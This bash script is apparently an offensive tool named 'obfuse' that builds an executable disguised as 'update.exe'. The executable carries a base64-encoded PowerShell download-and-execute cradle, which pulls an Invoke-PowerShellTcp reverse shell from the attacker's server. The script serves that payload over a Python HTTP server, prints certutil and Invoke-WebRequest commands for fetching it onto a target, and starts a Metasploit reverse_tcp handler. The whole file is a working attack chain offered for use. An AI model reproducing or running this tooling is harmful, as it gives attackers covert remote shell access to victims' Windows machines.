#!/bin/bash

# Author: Arben Shala (spenkk)
# This script has been tested on Kali Linux
# Malware.exe has been tested on Windows 10 Version 1903


banner () {

echo -e """\e[31m

 ██████╗ ██████╗ ███████╗██╗   ██╗███████╗███████╗
██╔═══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝
██║   ██║██████╔╝█████╗  ██║   ██║███████╗█████╗  
██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║██╔══╝  
╚██████╔╝██████╔╝██║     ╚██████╔╝███████║███████╗
 ╚═════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝
\tAuthor: Arben Shala (@spenkk)                                                  
	\e[39m"""
	}


display_usage() { 
	echo -e "\nUsage:\e[36m$0 attacker_ip attacker_port\e[39m" 
	} 

check_dependencies () {
	if ! [ -x "$(command -v go)" ]; then
		echo -e '\e[31mError: golang is not installed.\e[39m\nPlease install it by executing \e[1mapt-get install golang\e[39m' >&2
		exit 1
	elif ! [ -x "$(command -v msfconsole)" ]; then
		echo -e '\e[31mError: metasploit-framework is not installed.\e[39m\nPlease install it from here\e[1mhttps://github.com/rapid7/metasploit-framework\e[39m' >&2
		exit 1
	fi }

check_dependencies
banner

if [  $# -le 1 ]; then 
	display_usage
	exit 1
fi 

if [ "$EUID" -ne 0 ]; then 
	echo "This script must be run with higher privileges so you won't have problems with msf handler!" 
	exit 1
fi 

set -e
if [ ! -d $PWD/src ]; then
	mkdir src
fi

cp Invoke-PowerShellTcp.ps1 src/obfuse.txt
sed -i -e "s/ATTACKER/$1/g" src/obfuse.txt
sed -i -e "s/PORT/$2/g" src/obfuse.txt

echo -e "\e[1m[*] Preparing GO file\e[39m"
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$1:8000/obfuse.txt')"
encoded_pwsh="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
sed "s/PAYLOAD/$encoded_pwsh/g" template.go > src/update.go
GOOS=windows GOARCH=386 go build -o src/update.exe src/update.go

echo -e "\e[92m[*] Starting HTTP Server in background to serve payload\e[39m"
if [ `python -c 'import sys; print(".".join(map(str, sys.version_info[:1])))'` -ne 3 ]; then
	cd src && python -m SimpleHTTPServer &>/dev/null &
else
	cd src && python -m http.server &>/dev/null &
fi

echo -e "\e[1m[*] Download from target:\n\e[39m\e[31mcertutil.exe -urlcache -split -f \"http://$1:8000/update.exe\" %TEMP%\\\update.exe"
echo "or"
echo -e "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://$1:8000/update.exe' -OutFile %TEMP%\\update.exe\""

echo -e "\e[39m\n[*] \e[1mStarting msf handler\e[39m"
msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/shell/reverse_tcp;\
set LHOST $1;\
set LPORT $2;\
exploit -j -z"

echo -e "\e[92m[*] Killing HTTP Server\e[39m"
fuser -k 8000/tcp